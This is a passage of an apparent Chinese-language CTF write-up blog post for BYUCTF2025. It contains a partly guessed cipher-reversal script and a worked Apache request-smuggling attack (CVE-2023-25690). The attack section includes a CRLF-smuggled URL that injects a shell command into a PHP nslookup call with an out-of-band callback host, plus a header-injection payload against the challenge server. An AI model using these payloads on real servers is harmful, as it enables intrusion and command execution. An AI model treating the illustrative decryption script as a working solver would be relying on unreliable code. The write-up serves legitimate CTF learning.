<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="刷">
<meta property="og:type" content="article">
<meta property="og:title" content="BYUCTF2025">
<meta property="og:url" content="https://baozongwi.xyz/posts/4a377860.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="刷">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250517-122357.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250517-123143.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250518-110355.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250518-103511.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250517-205911.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250518-103216.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250518-111552.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250518-114842.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250517-190040.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250517-191844.jpg">
<meta property="article:published_time" content="2025-05-17T02:02:30.000Z">
<meta property="article:modified_time" content="2025-08-08T03:53:14.949Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="xss">
<meta property="article:tag" content="jail">
<meta property="article:tag" content="jwt">
<meta property="article:tag" content="日志分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/5/BYUCTF2025/QQ20250517-122357.jpg">


<link rel="canonical" href="https://baozongwi.xyz/posts/4a377860.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/4a377860.html","path":"posts/4a377860.html","title":"BYUCTF2025"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>BYUCTF2025 | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Anaken21sec1"><span class="nav-number">1.</span> <span class="nav-text">Anaken21sec1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PEM"><span class="nav-number">2.</span> <span class="nav-text">PEM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Willy-Wonka-Web"><span class="nav-number">3.</span> <span class="nav-text">Willy Wonka Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Red-This"><span class="nav-number">4.</span> <span class="nav-text">Red This</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cooking-Flask"><span class="nav-number">5.</span> <span class="nav-text">Cooking Flask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JWTF"><span class="nav-number">6.</span> <span class="nav-text">JWTF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wembsoncket"><span class="nav-number">7.</span> <span class="nav-text">Wembsoncket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Are-You-Looking-Me-Up"><span class="nav-number">8.</span> <span class="nav-text">Are You Looking Me Up?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mine-Over-Matter"><span class="nav-number">9.</span> <span class="nav-text">Mine Over Matter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enabled"><span class="nav-number">10.</span> <span class="nav-text">Enabled</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">小结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/4a377860.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="BYUCTF2025 | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="刷">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BYUCTF2025
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-05-17 10:02:30" itemprop="dateCreated datePublished" datetime="2025-05-17T10:02:30+08:00">2025-05-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 11:53:14" itemprop="dateModified" datetime="2025-08-08T11:53:14+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">赛题</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>25k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>42 mins.</span>
    </span>
</div>

            <div class="post-description">刷</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="Anaken21sec1"><a href="#Anaken21sec1" class="headerlink" title="Anaken21sec1"></a>Anaken21sec1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;cnpiaytjyzggnnnktjzcvuzjexxkvnrlfzectovhfswyphjt&quot;</span></span><br><span class="line">key = <span class="string">&quot;orygwktcjpb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 生成 keyNums 序列</span></span><br><span class="line">keyNums = [<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> key]  <span class="comment"># 将密钥字符映射为 0-25 的数</span></span><br><span class="line">n = <span class="built_in">len</span>(key)</span><br><span class="line">L = <span class="built_in">len</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 逆列换位：按行构造网格，重排列</span></span><br><span class="line">rows = ceil(L / n)</span><br><span class="line"><span class="comment"># 初始化网格（可能有空缺）</span></span><br><span class="line">grid = [[<span class="string">&#x27;&#x27;</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rows)]</span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> idx &lt; L:</span><br><span class="line">            grid[r][c] = cipher[idx]</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算列排序：根据 key 字母的字母序确定新列位置</span></span><br><span class="line">sorted_cols = <span class="built_in">sorted</span>(<span class="built_in">range</span>(n), key=<span class="keyword">lambda</span> i: key[i])</span><br><span class="line"><span class="comment"># 创建原始位置的空网格</span></span><br><span class="line">orig_grid = [[<span class="string">&#x27;&#x27;</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rows)]</span><br><span class="line"><span class="comment"># 恢复列顺序：sorted_cols[j] 列是原始列 j</span></span><br><span class="line"><span class="keyword">for</span> new_c, old_c <span class="keyword">in</span> <span class="built_in">enumerate</span>(sorted_cols):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        orig_grid[r][old_c] = grid[r][new_c]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从恢复列换位后的网格读取中间密文</span></span><br><span class="line">mid_cipher = <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;&quot;</span>.join(row) <span class="keyword">for</span> row <span class="keyword">in</span> orig_grid).replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 分块并逐块逆向变换</span></span><br><span class="line">blocks = [mid_cipher[i:i+<span class="number">12</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mid_cipher), <span class="number">12</span>)]</span><br><span class="line">plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> blk <span class="keyword">in</span> blocks:</span><br><span class="line">    <span class="comment"># 将字符转矩阵（此处举例按行填充到6x6，其余设为 None）</span></span><br><span class="line">    M = [[<span class="literal">None</span>]*<span class="number">6</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">    <span class="comment"># 将 blk 的字符填入 M，例如按行前12个位置（具体映射规则以加密为准）</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(blk):</span><br><span class="line">                M[r][c] = blk[idx]</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 对 M 执行 5 轮逆向操作：每轮先逆向加法再逆向置换</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        k = keyNums[<span class="built_in">round</span>] % <span class="number">5</span></span><br><span class="line">        <span class="comment"># 逆向加法：对 M 中每个元素做减法（具体减到的数字要模回字母表或方阵大小）</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> M[r][c] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># 示例：假设 M[r][c] 为字母，先映射到 0-25，加了 k 后取模，现在减去 k</span></span><br><span class="line">                    val = <span class="built_in">ord</span>(M[r][c]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                    val = (val - k) % <span class="number">26</span></span><br><span class="line">                    M[r][c] = <span class="built_in">chr</span>(val + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="comment"># 逆向置换：对矩阵 M 进行对应的逆置换操作（例如逆时针旋转等）</span></span><br><span class="line">        <span class="comment"># 下面示意为逆时针 90°，具体操作需对应加密用的矩阵</span></span><br><span class="line">        M = [<span class="built_in">list</span>(row) <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">zip</span>(*M)][::-<span class="number">1</span>]  <span class="comment"># 逆时针旋转示例</span></span><br><span class="line">    <span class="comment"># 从矩阵 M 提取明文（取按加密时相同的填充方式读取字符）</span></span><br><span class="line">    <span class="comment"># 这里假设只读最初填的那12个位置</span></span><br><span class="line">    plain_blk = <span class="string">&quot;&quot;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> M[r][c] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> count &lt; <span class="number">12</span>:</span><br><span class="line">                plain_blk += M[r][c]</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">    plaintext += plain_blk</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered plaintext:&quot;</span>, plaintext)</span><br><span class="line"><span class="comment"># 4. 提取 flag：最终得到的 plaintext 应包含 flag 格式，比如 &quot;byuctf&#123;...&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PEM"><a href="#PEM" class="headerlink" title="PEM"></a>PEM</h2><p><code>byuctf&#123;P3M_f0rm4t_1s_k1ng&#125;</code></p>
<h2 id="Willy-Wonka-Web"><a href="#Willy-Wonka-Web" class="headerlink" title="Willy Wonka Web"></a>Willy Wonka Web</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">    ServerName localhost</span><br><span class="line">    DocumentRoot /usr/local/apache2/htdocs</span><br><span class="line"></span><br><span class="line">    RewriteEngine on</span><br><span class="line">    RewriteRule &quot;^/name/(.*)&quot; &quot;http://backend:3000/?name=$1&quot; [P]</span><br><span class="line">    ProxyPassReverse &quot;/name/&quot; &quot;http://backend:3000/&quot;</span><br><span class="line"></span><br><span class="line">    RequestHeader unset A</span><br><span class="line">    RequestHeader unset a</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<p>去掉了<code>A</code>和<code>a</code>，同时写了一个反代，当我们传参<code>/name/test</code>的时候就相当于<code>http://backend:3000/?name=test</code>，无从下手，后面搜索绕过<code>unset</code>，可以搜出来请求走私，发现<strong>CVE-2023-25690</strong>，但是我怎么打都没有成功，我本地复现一下这个CVE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dhmosfunk/CVE-2023-25690-POC.git</span><br><span class="line">cd CVE-2023-25690-POC/lab</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You category ID is: &#x27;</span> . <span class="variable">$id</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please insert the ID parameter in the URL&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Internal secret functionality</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;nslookup &#x27;</span> . <span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以RCE，但是没有回显，我们外带试试能否成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://156.238.233.93/categories/test%20HTTP/1.1%0d%0aHost:%20156.238.233.93%0d%0a%0d%0aGET%20/categories.php%3fsecret=4fz7yove.requestrepo.com;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250517-122357.jpg" alt="1"></p>
<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250517-123143.jpg" alt="1"></p>
<p>复现完之后思路就很清晰了，只需要加个http头即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wonka.chal.cyberjousting.com/name/test%20HTTP/1.1%0d%0aa:admin%0d%0aHost:%20wonka.chal.cyberjousting.com%0d%0a%0d%0aGET%20/name/test</span><br></pre></td></tr></table></figure>

<h2 id="Red-This"><a href="#Red-This" class="headerlink" title="Red This"></a>Red This</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 